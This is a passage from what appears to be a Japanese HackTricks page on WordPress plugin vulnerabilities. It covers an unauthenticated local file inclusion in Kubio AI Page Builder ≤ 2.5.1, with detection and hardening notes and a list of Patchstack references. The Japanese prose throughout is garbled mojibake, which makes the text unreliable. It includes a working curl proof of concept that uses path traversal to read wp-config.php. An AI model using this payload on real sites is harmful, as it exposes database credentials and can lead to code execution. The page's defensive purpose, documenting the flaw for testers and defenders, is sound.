- s ã«å¯¾ã—ã¦å³å¯†ãªè¨±å¯ãƒªã‚¹ãƒˆã‚’è¿½åŠ ã—ã€æœŸå¾…ã•ã‚Œã‚‹æ–‡å­—ã‚»ãƒƒãƒˆï¼é•·ã•ã«æ­£è¦åŒ–ã™ã‚‹

---

## èªè¨¼ä¸è¦ã® Local File Inclusion via unvalidated template/file path (Kubio AI Page Builder â‰¤ 2.5.1)

ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã§æ”»æ’ƒè€…åˆ¶å¾¡ã®ãƒ‘ã‚¹ã‚’æ­£è¦åŒ–ï¼åˆ¶é™ã›ãšã«å—ã‘å…¥ã‚Œã‚‹ã¨ã€ä»»æ„ã®ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã®èª­ã¿å–ã‚Šã‚’è¨±ã—ã€includable ãª PHP ã‚„ãƒ­ã‚°ãƒ•ã‚¡ã‚¤ãƒ«ãŒå®Ÿè¡Œæ™‚ã«å–ã‚Šè¾¼ã¾ã‚Œã‚‹å ´åˆã¯ã‚³ãƒ¼ãƒ‰å®Ÿè¡ŒãŒç™ºç”Ÿã™ã‚‹ã“ã¨ãŒã‚ã‚‹ã€‚

- ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿: __kubio-site-edit-iframe-classic-template
- è„†å¼±æ€§: æ­£è¦åŒ–ï¼è¨±å¯ãƒªã‚¹ãƒˆãŒãªãã€ãƒ‘ã‚¹ãƒ»ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ãŒå¯èƒ½
- å½±éŸ¿: ç§˜å¯†æƒ…å ±ã®æ¼æ´© (wp-config.php)ã€ç‰¹å®šã®ç’°å¢ƒã§ã¯ RCE ã®å¯èƒ½æ€§ (log poisoningã€includable PHP)

PoC â€“ wp-config.php ã‚’èª­ã¿å–ã‚‹
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
æ¤œå‡ºãƒã‚§ãƒƒã‚¯ãƒªã‚¹ãƒˆ
- realpath() ã«ã‚ˆã‚‹åŒ…å«ãƒã‚§ãƒƒã‚¯ã‚’è¡Œã‚ãšã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ‘ã‚¹ã‚’ include()/require()/read ã‚·ãƒ³ã‚¯ã«é€£çµã™ã‚‹ãƒãƒ³ãƒ‰ãƒ©ãƒ¼ãŒãªã„ã‹ç¢ºèªã™ã‚‹
- æ„å›³ã—ãŸ templates ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®å¤–ã«åˆ°é”ã™ã‚‹ traversal ãƒ‘ã‚¿ãƒ¼ãƒ³ (../) ã‚’æ¢ã™

ãƒãƒ¼ãƒ‰ãƒ‹ãƒ³ã‚°
- è¨±å¯ãƒªã‚¹ãƒˆåŒ–ã•ã‚ŒãŸãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚’å¼·åˆ¶ã™ã‚‹ã€‚realpath() ã§è§£æ±ºã—ã€str_starts_with(realpath(file), realpath(allowed_base)) ã‚’è¦æ±‚ã™ã‚‹
- å…¥åŠ›ã‚’æ­£è¦åŒ–ã™ã‚‹ã€‚traversal ã‚·ãƒ¼ã‚±ãƒ³ã‚¹ã¨çµ¶å¯¾ãƒ‘ã‚¹ã‚’æ‹’å¦ã™ã‚‹ã€‚sanitize_file_name() ã¯ãƒ•ã‚¡ã‚¤ãƒ«åï¼ˆãƒ•ãƒ«ãƒ‘ã‚¹ã§ã¯ãªãï¼‰ã«ã®ã¿ä½¿ç”¨ã™ã‚‹


## References

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset â€“ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments â‰¤ 5.6.1 â€“ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation â€“ Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025â€™s most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) â‰¤ 1.0.82 â€“ Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations â‰¤ 3.5.3 â€“ Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider â‰¤ 3.6.1 â€“ Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder â‰¤ 2.5.1 â€“ Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
